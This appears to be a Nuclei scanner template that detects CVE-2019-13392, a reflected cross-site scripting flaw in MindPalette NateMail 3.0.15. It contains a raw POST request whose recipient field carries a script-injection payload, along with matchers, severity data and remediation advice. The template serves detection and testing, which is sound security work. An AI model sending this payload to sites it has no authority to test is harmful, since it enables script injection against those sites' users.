http:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  raw:
  - 'POST /NateMail.php HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Content-Type: application/x-www-form-urlencoded


    recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

    '
id: CVE-2019-13392
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:mindpalette:natemail:3.0.15:*:*:*:*:*:*:*
    cve-id: CVE-2019-13392
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.90401
    epss-score: 0.06053
  description: MindPalette NateMail 3.0.15 is susceptible to reflected cross-site
    scripting which could allows an attacker to execute remote JavaScript in a victim's
    browser via a specially crafted POST request. The application will reflect the
    recipient value if it is not in the NateMail recipient array. Note that this array
    is keyed via integers by default, so any string input will be invalid.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    max-request: 1
    product: natemail
    vendor: mindpalette
  name: MindPalette NateMail 3.0.15 - Cross-Site Scripting
  reference:
  - https://www.doyler.net/security-not-included/natemail-vulnerabilities
  - https://mindpalette.com/tag/natemail/
  - https://nvd.nist.gov/vuln/detail/CVE-2019-13392
  - https://twitter.com/mindpalette
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Upgrade to the latest version of MindPalette NateMail to fix the XSS
    vulnerability.

    '
  severity: medium
  tags: cve,cve2019,natemail,xss,mindpalette,vuln
